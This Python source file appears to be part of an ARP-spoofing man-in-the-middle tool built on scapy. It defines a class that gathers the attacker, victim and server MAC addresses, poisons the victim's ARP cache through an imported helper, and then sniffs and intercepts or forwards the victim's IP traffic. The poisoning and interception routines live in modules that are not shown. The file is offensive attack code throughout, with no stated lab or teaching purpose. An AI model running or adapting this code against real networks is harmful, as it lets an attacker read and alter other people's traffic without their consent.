from scapy.all import *
import arpSpoof
import util
import interceptor


class Arp():
    def __init__(self, networkInterface, victimIP, spoofIP, forward):
        self.networkInterface = networkInterface
        self.victimIP = victimIP
        self.spoofIP = spoofIP
        self.forward = forward
        self.attackerMAC = get_if_hwaddr(networkInterface)
        self.victimMAC = util.getMAC(victimIP, networkInterface) # get victim MAC adress
        self.serverMAC = [util.getMAC(ip, networkInterface) for ip in spoofIP]  # get array of MAC of poisoned ips in victim arp table
        self.interceptedPkt = []

    def startSniff(self):
        sniff(prn=self.intercept, iface=self.networkInterface, filter="ip", timeout = 20)

    def startLoudSniff(self):
        sniff(prn=self.interceptLoud, iface=self.networkInterface, filter="ip", timeout = 20)

    def intercept(self, pkt):
         interceptor.interceptARP(pkt, self.interceptedPkt, self.attackerMAC, self.spoofIP, self.serverMAC, self.victimMAC, self.networkInterface, self.forward)

    def interceptLoud(self, pkt):
        interceptor.loudARP(pkt, self.interceptedPkt, self.attackerMAC, self.spoofIP, self.serverMAC,
                                 self.victimMAC, self.networkInterface)

    def spoof(self):
        arpSpoof.arpPoisoning(self.victimIP, self.spoofIP, self.networkInterface)


    def start(self):
        self.spoof()
        self.startSniff()


